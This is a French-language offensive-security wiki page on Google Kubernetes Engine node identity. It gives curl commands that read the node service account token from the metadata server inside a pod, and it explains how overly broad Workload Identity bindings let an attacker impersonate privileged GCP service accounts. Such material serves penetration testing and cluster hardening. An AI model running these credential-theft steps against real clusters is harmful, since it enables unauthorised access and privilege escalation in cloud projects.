---
title: "Identité du nœud : voler le compte de service du nœud et Workload Identity"
description: "Voler le jeton du compte de service du node pool GKE depuis les métadonnées du nœud, et abuser de Workload Identity pour usurper les comptes de service de pods."
keywords:
  - node identity
  - node service account
  - Workload Identity
  - metadata
  - kubelet
---

# Identité du nœud

Un nœud GKE est une VM Compute Engine : un pod capable d'atteindre le **serveur de métadonnées** du nœud lit donc le jeton du compte de service du node pool, qui est fréquemment le compte de service Compute Engine par défaut doté de rôles de projet larges. Là où **Workload Identity** est activé, les pods échangent à la place un jeton Kubernetes projeté contre un jeton de compte de service GCP, et une liaison trop permissive permet à un pod d'assumer l'identité d'une autre charge de travail.

## Jeton de compte de service du nœud depuis un pod

```bash
# from inside a pod that is not blocked from the node metadata endpoint
curl -s -H 'Metadata-Flavor: Google' \
  http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
curl -s -H 'Metadata-Flavor: Google' \
  http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email
```

Le GKE Metadata Server (partie de Workload Identity) est censé bloquer cette voie du compte de service du nœud pour les pods ; les clusters qui en sont dépourvus, ou avec des pods `hostNetwork`, exposent encore le jeton de nœud brut.

## Abus de Workload Identity

```bash
# a pod bound to a GCP SA via Workload Identity gets that SA's token from the GKE metadata server
curl -s -H 'Metadata-Flavor: Google' \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# if you can edit the KSA->GSA binding (iam.serviceAccounts.setIamPolicy with
# roles/iam.workloadIdentityUser), map a pod to a more privileged GSA
```

## Notes d'exploitation

- Le jeton du compte de service du nœud est borné par les portées OAuth du nœud, exactement comme toute [instance Compute Engine](../compute-engine/service-account-scope.md) ; `cloud-platform` sur le node pool est le pire des cas.
- Workload Identity est la conception recommandée, mais une liaison `roles/iam.workloadIdentityUser` trop large vous permet de rattacher votre pod à un GSA privilégié.
- Les mécaniques de récupération de credentials sont partagées avec [métadonnées d'instance](../../credentials/instance-metadata/index.md).

## Outils

- **curl** contre l'endpoint de métadonnées du nœud depuis un pod.
- **Peirates**, **kubectl** pour les étapes internes au cluster.

## Références

- [HackTricks Cloud: GCP GKE node attacks](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/index.html)
- [Hacking the Cloud: GCP](https://hackingthe.cloud/)
- [Google: GKE Workload Identity](https://cloud.google.com/kubernetes-engine/docs/concepts/workload-identity)
